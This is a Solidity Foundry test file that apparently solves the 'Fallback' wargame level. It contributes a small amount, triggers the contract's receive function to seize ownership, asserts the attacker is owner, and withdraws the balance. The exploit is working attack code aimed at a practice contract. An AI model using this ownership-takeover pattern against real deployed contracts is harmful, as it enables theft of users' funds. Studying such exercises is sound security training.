// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback fallbackContract;
    address attacker;

    function setUp() public {
        fallbackContract = new Fallback();
        attacker = vm.addr(1);
        vm.deal(address(fallbackContract), 1 ether); 
    }

    function testExploit() public {
        vm.deal(attacker, 1 ether);

        vm.startPrank(attacker);

        fallbackContract.contribute{value: 0.0001 ether}();

        (bool success,) = address(fallbackContract).call{value: 0.0001 ether}("");
        require(success, "receive failed");

        assertEq(fallbackContract.owner(), attacker);

        fallbackContract.withdraw();

        vm.stopPrank();
    }
}